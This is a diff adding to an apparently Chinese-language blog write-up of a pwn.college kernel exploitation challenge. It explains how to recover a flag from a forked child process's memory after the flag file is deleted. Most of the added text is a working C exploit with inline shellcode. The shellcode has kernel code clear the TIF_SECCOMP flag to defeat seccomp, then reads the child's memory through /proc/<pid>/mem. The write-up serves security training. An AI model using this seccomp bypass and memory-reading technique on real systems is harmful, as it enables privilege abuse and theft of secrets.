@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: System Security (Kernel Security) series"
 published: 2025-12-19
-updated: 2025-12-25
+updated: 2026-01-05
 description: "Write-ups for pwn.college kernel exploitation series."
 image: "https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.pfs8v4jqs.avif"
 tags: ["Pwn", "Write-ups", "Kernel"]
@@ -904,4 +904,116 @@ int main(void) {
 
 ## Write-up
 
+`load_flag` 把 flag 加载到 fork 出来的子进程里面，并在返回 main 函数后通过 `unlink("/flag");` 将 `/flag` 文件删除了。但是我们注意到 fork 出来的子进程并没有退出，因此可以读取子进程的内存来输出 flag.
+
+```c
+int load_flag()
+{
+  int fd; // [rsp+4h] [rbp-Ch]
+  sem_t *sem; // [rsp+8h] [rbp-8h]
+
+  puts("Attempting to load the flag into memory.\n");
+  sem = (sem_t *)mmap(0, 0x1000u, 3, 33, 0, 0);
+  sem_init(sem, 1, 0);
+  if ( !fork() )
+  {
+    fd = open("/flag", 0);
+    if ( fd < 0 )
+      exit(1);
+    read(fd, &flag_23583, 0x100u);
+    close(fd);
+    sem_post(sem);
+    while ( 1 )
+      sleep(1u);
+  }
+  return sem_wait(sem);
+}
+```
+
+是时候祭出我写的 [axium](https://github.com/CuB3y0nd/axium) 了，目前是根据我 pwncollege 做题遇到的需求在拓展功能，后面还会继续更新更多内容，希望能成为 kernel exploitation 界的 pwntools xD
+
+看看这道题用上 axium 后的实战效果：
+
+<center>
+  <img src="https://cdn.cubeyond.net/gh/CuB3y0nd/picx-images-hosting@master/.96a83lkt89.avif" alt="" />
+</center>
+
 ## Exploit
+
+```c
+#include "axium/log.h"
+#include "axium/tubes/process.h"
+#include "axium/tubes/tube.h"
+#include "axium/utils/payload.h"
+#include "axium/utils/proc.h"
+#include <stdio.h>
+#include <string.h>
+
+#define PACKED __attribute__((packed))
+#define NAKED __attribute__((naked))
+
+#define STR(x) #x
+#define XSTR(x) STR(x)
+
+#define TIF_SECCOMP 8
+
+NAKED void shellcode(void) {
+  __asm__ volatile(
+      ".intel_syntax noprefix;"
+      ".global sc_start;"
+      ".global sc_end;"
+      "sc_start:;"
+      "mov rdi, 0x3;"
+      "lea rsi, [rip + break_seccomp_start];"
+      "mov rdx, break_seccomp_end - break_seccomp_start;"
+      "mov rax, 0x1;"
+      "syscall;" // write(0x3, break_seccomp_start, sizeof(break_seccomp))
+      "lea rdi, [rip + path];"
+      "xor rsi, rsi;"
+      "mov rax, 0x2;"
+      "syscall;" // open(\"/proc/pid/mem\", 0x0)
+      "mov rdi, 0x1;"
+      "mov rsi, rax;"
+      "push 0x404040;"
+      "mov rdx, rsp;"
+      "mov r10, 0x1337;"
+      "mov rax, 0x28;"
+      "syscall;" // sendfile(0x1, fd, 0x404040, 0x1337)
+      "break_seccomp_start:;"
+      "mov rax, QWORD PTR gs:0x15d00;"
+      "and QWORD PTR [rax], ~(1 << " XSTR(
+          TIF_SECCOMP) ");"
+                       "ret;"
+                       "break_seccomp_end:;"
+                       "path: .ascii \"/proc/XXXXXXXXXX/mem\";"
+                       "sc_end:;"
+                       ".att_syntax;");
+}
+
+extern char sc_start[];
+extern char sc_end[];
+
+int main(void) {
+  char *const challenge_argv[] = {"/challenge/babykernel_level11.0", NULL};
+  tube *t = process_ext(challenge_argv, NULL, TUBE_STDIN);
+  pid_t child_pid = t_pid(t) + 1;
+
+  if (!wait_for_pid(child_pid, 1000)) {
+    log_exception("spawn child process");
+    return -1;
+  }
+
+  size_t sc_size = sc_end - sc_start;
+  uint8_t sc[sc_size];
+  memcpy(sc, sc_start, sc_size);
+
+  const char *marker = "/proc/XXXXXXXXXX/mem";
+  char real_path[32];
+  snprintf(real_path, sizeof(real_path), "/proc/%d/mem", child_pid);
+
+  patch(sc, sc_size, marker, strlen(marker), real_path, strlen(real_path));
+  t_sendline(t, sc, sc_size);
+
+  return 0;
+}
+```
